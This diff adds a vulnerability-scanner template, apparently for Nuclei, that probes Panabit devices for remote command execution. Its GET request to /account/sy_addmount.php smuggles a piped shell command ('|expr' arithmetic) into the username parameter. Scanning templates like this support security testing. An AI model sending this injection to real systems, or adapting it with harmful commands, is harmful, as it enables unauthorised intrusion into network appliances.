@@ -1,0 +1,21 @@
+id: poc-yaml-panabit-syaddmount-command-exec
+
+info:
+  name: poc-yaml-panabit-syaddmount-command-exec
+  author: NoHack(https://hack8.org)
+  severity: critical
+  tags: xray-converted,rce,ct-490513
+  reference:
+    - https://blog.csdn.net/weixin_51387754/article/details/121147617
+
+http:
+  - raw:
+      - |
+        GET /account/sy_addmount.php?username=|expr%20{{rand_int(1000, 9999)}}%20%2B%20{{rand_int(1000, 9999)}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
